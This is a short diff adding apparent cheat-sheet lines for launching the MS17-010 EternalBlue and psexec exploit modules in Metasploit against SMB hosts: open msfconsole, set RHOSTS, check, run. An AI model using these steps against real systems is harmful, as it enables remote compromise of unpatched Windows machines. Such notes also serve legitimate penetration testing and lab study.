@@ -1,0 +1,7 @@
+msfconsole
+windows/smb/ms17_010_eternalblue
+windows/smb/ms17_010_psexec
+
+SET RHOSTS
+check
+run
